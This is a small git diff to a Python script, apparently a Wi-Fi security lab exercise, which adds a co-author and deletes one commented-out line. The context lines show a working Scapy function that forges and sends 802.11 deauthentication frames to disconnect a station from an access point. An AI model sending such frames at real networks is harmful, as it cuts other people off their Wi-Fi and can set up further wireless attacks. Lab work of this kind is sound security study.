@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 """
-Author: Rébecca Tevaearai, 
+Author: Rébecca Tevaearai, Rosy-Laure Wonjamouna
 
 Created: 26th March, 2022
 """
@@ -30,7 +30,6 @@ def de_auth(reason_code: str, STA_mac: str, ap_mac: str, interface: str, count: 
     elif reason_code == '8' or reason_code == '1':
         dot11 = Dot11(addr1 = ap_mac, addr2 = STA_mac, addr3 = STA_mac)
 
-    #dot11 = Dot11(addr1 = STA_mac, addr2 = ap_mac, addr3 = ap_mac)
     packet = RadioTap()/dot11/Dot11Deauth(reason = reason_code)
     sendp(packet, inter = 0.1, count = count, iface = interface, verbose = 1)
 
